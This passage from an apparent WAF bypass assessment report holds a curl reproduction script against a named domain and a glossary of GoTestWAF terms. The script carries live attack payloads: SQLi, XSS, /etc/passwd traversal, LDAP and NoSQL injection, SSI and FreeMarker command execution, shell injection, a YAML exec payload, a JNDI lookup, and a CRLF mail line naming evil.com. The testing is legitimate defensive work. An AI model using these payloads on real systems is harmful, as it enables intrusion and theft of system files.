## 15. Reproduction

Run the negative controls first and last; a reproduced bypass means nothing if the WAF is
not actually in the path.

```bash
D=https://superman.chubbyduck.org
c() { curl -sk -o /dev/null -w "%{http_code}  $1\n" "${@:2}"; }

# C-00 negative controls - both MUST be 403
c "control sqli"  "$D/?q=1%27%20UNION%20SELECT%201,2--"
c "control xss"   "$D/?q=%3Cscript%3Ealert(1)%3C/script%3E"

# F-01 normalisation - each pair: the first is blocked, the second is not
c "F-01 traversal url"    "$D/?q=%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd"
c "F-01 traversal b64"    "$D/?q=L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA"
c "F-01 lfi overlong"     "$D/?q=%25C0%25AE%25C0%25AE%25C0%25AF%25C0%25AE%25C0%25AE%25C0%25AFetc%25C0%25AFpasswd"
c "F-01 sqli comment"     "$D/?q=%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F+"

# F-03 LDAP, F-05 SSI, F-06 SSTI, F-11 mail - whole rule groups
c "F-03 ldap bypass"      "$D/?q=%28%26%28uid%3Dadmin%29%28%21%28%26%281%3D0%29%28userPassword%3Dq%29%29%29%29"
c "F-03 ldap objectclass" "$D/?q=%2A%28%7C%28objectclass%3D%2A%29%29"
c "F-05 ssi exec"         "$D/?q=%3C%21--%23exec%20cmd%3D%22ls%22%20--%3E"
c "F-06 freemarker"       "$D/?q=%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D"
c "F-11 mail rcpt"        "$D/?q=%0D%0ARCPT%20TO%3A%20test%40evil.com%0D%0A"

# F-07 command execution - the Critical ones
c "F-07 getent IFS"       "$D/?q=%3Bgetent%24IFS%249hosts%24IFS%249example.com%3Becho%24IFS%249%24%28%283482%2A7301%29%29%3B"
c "F-07 set /a"           "$D/?q=%7C%20set%20%2Fa%203482%2A7301"
c "F-07 python exec"      "$D/?q=%21%21python%2Fobject%2Fnew%3Aexec%20%5Bimport%20socket%5D"
c "F-07 header backtick"  "$D/" -H 'X-Payload: ax--exec=`id`--remote=origin'
c "F-07 header cat"       "$D/" -H "X-Payload: ; cat /et'c/pa'ss'wd"

# F-04 NoSQL, F-10 JNDI, F-14 scanner UA
c "F-04 nosql where"      "$D/?q=true%2C%20%24where%3A%20%2799%20%3D%3D%2088%27"
c "F-10 jndi in UA"       "$D/" -H 'User-Agent: ${jndi:ldap://example.com/a}'
c "F-14 sqlmap UA"        "$D/" -H 'User-Agent: sqlmap/1.7.4#stable (https://sqlmap.org)'

# F-15 false positive - all three MUST become 200 after R-06
c "F-15 fp urlparam"      "$D/?q=java%20lang%20courses"
c "F-15 fp form"          "$D/" -X POST -d 'q=java lang courses'
c "F-15 fp multipart"     "$D/" -X POST -F 'q=java lang courses'
```

Out-of-band callback hosts in the original payloads were replaced with `example.com`; the
arithmetic oracle (`3482*7301` → `25420682`) is kept because it confirms execution without
contacting anything. After each run, join the origin's evidence log to confirm reach:

```bash
docker compose logs --no-color api | grep '^{' \
  | jq -r 'select(.category!=null) | [.rid,.category,.surface,.status] | @tsv'
```

A finding is **confirmed** only when the status matches *and* an origin log line exists.
Otherwise downgrade it to *unproven*.

---

## 16. Glossary

| Term | Meaning |
| --- | --- |
| **Placeholder** | where in the request the payload sits. `URLParam` = query string; `URLPath` = a path segment; `Header` = an arbitrary header; `UserAgent`; `HTMLForm` = urlencoded body; `HTMLMultipartForm`; `JSONRequest`; `XMLBody`; `SOAPBody`; `RawRequest` = a hand-written raw request |
| **Encoder** | `Plain` = as written; `URL` = percent-encoded; `Base64Flat` = base64 of the payload |
| **Test set / case** | corpus grouping. `owasp`, `owasp-api`, `community` are attack sets; `false-pos` is benign input that must **not** be blocked |
| **True positive** | an attack payload. Blocking it is correct |
| **True negative** | a benign payload. Blocking it is a false positive |
| **Bypassed** | GoTestWAF's term for "not blocked". This report splits it into *bypassed* (200), *unproven* (404) and *untested* (405) |
| **Unresolved** | a status in neither list. With `--nonBlockedAsPassed` the count is reported as 0 and the requests are folded elsewhere — see §4 |
| **Failed** | the request did not complete, usually a dropped connection |
